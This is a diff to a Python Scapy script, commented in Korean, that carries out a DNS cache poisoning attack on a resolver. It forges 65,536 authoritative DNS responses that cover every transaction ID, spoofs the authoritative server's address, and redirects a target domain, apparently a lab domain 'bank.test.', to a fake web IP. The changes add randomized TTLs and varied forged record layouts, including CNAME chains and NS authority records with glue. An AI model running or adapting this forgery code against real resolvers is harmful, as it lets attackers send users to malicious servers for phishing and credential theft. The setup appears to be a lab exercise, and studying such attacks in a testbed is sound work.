@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 from scapy.all import *
 import os
+import random
 import sys
 import time
+from collections import Counter
 
 # === [ 설정 단계 ] ===
 def require_env(name):
@@ -18,19 +20,60 @@ FAKE_IP = require_env("FAKE_WEB_IP")
 TARGET_PORT = int(require_env("RESOLVER_ATTACK_UDP_PORT"))
 DNS_PORT = int(require_env("DNS_PORT"))
 ATTACK_NS_NAME = require_env("ATTACK_NS_NAME")
+TTL_POOL = [30, 60, 120, 300, 600, 1200, 3600, 7200, 21600, 43200, 86400]
+TTL_WEIGHTS = [4, 5, 5, 8, 8, 8, 10, 10, 10, 16, 16]
+RESPONSE_TEMPLATE_WEIGHTS = [
+    ("a_only", 25),
+    ("a_additional", 15),
+    ("cname_a", 20),
+    ("cname_a_additional", 10),
+    ("a_authority", 20),
+    ("a_authority_glue", 10),
+]
+RNG = random.Random()
 
-def make_packet(txid):
-    """
-    조작된 DNS 응답 패킷 생성 (Additional Section 포함)
-    """
+def choose_weighted(weighted_items):
+    items = [item for item, _ in weighted_items]
+    weights = [weight for _, weight in weighted_items]
+    return RNG.choices(items, weights=weights, k=1)[0]
+
+
+def canonical_name():
+    return f"edge.{TARGET_DOMAIN.rstrip('.')}."
+
+
+def make_packet(txid, template_name=None, ttl=None):
+    template_name = template_name or choose_weighted(RESPONSE_TEMPLATE_WEIGHTS)
+    ttl = ttl if ttl is not None else RNG.choices(TTL_POOL, weights=TTL_WEIGHTS, k=1)[0]
     ip = IP(src=AUTH_SERVER_IP, dst=RESOLVER_IP)
     udp = UDP(sport=DNS_PORT, dport=TARGET_PORT)
+    answer = DNSRR(rrname=TARGET_DOMAIN, type='A', rclass='IN', ttl=ttl, rdata=FAKE_IP)
+    authority = None
+    additional = None
+
+    if template_name == "a_additional":
+        additional = DNSRR(rrname=ATTACK_NS_NAME, type='A', rclass='IN', ttl=ttl, rdata=FAKE_IP)
+    elif template_name in ("cname_a", "cname_a_additional"):
+        alias = canonical_name()
+        answer = (
+            DNSRR(rrname=TARGET_DOMAIN, type='CNAME', rclass='IN', ttl=ttl, rdata=alias)
+            / DNSRR(rrname=alias, type='A', rclass='IN', ttl=ttl, rdata=FAKE_IP)
+        )
+        if template_name == "cname_a_additional":
+            additional = DNSRR(rrname=ATTACK_NS_NAME, type='A', rclass='IN', ttl=ttl, rdata=FAKE_IP)
+    elif template_name == "a_authority":
+        authority = DNSRR(rrname="bank.test.", type='NS', rclass='IN', ttl=ttl, rdata=ATTACK_NS_NAME)
+    elif template_name == "a_authority_glue":
+        authority = DNSRR(rrname="bank.test.", type='NS', rclass='IN', ttl=ttl, rdata=ATTACK_NS_NAME)
+        additional = DNSRR(rrname=ATTACK_NS_NAME, type='A', rclass='IN', ttl=ttl, rdata=FAKE_IP)
+
     dns = DNS(
         id=txid,
         qr=1, aa=1, rd=1,
         qd=DNSQR(qname=TARGET_DOMAIN),
-        an=DNSRR(rrname=TARGET_DOMAIN, type='A', rclass='IN', ttl=86400, rdata=FAKE_IP),
-        ar=DNSRR(rrname=ATTACK_NS_NAME, type='A', rclass='IN', ttl=86400, rdata=FAKE_IP)
+        an=answer,
+        ns=authority,
+        ar=additional,
     )
     return ip/udp/dns
 
@@ -41,12 +84,15 @@ def start_attack():
     print(f"[*] [Step 1] 패킷 {65536} 개 생성 시작... 잠시만 기다려 주세요.")
     start_gen = time.time()
     
-    # 리스트 컴프리헨션을 사용하여 생성 속도를 높였습니다.
-    pkts = [make_packet(txid) for txid in range(65536)]
+    templates = [choose_weighted(RESPONSE_TEMPLATE_WEIGHTS) for _ in range(65536)]
+    ttls = [RNG.choices(TTL_POOL, weights=TTL_WEIGHTS, k=1)[0] for _ in range(65536)]
+    pkts = [make_packet(txid, templates[txid], ttls[txid]) for txid in range(65536)]
     
     end_gen = time.time()
     print(f"[*] [Step 1] 생성 완료! (소요 시간: {end_gen - start_gen:.2f} 초)")
     print(f"[*] 현재 메모리에 {len(pkts)} 개의 패킷이 장전되었습니다.")
+    print(f"[*] response templates: {dict(Counter(templates))}")
+    print(f"[*] ttl distribution: {dict(sorted(Counter(ttls).items()))}")
     
     # 2. 대기 및 발사 단계
     print("\n" + "="*50)
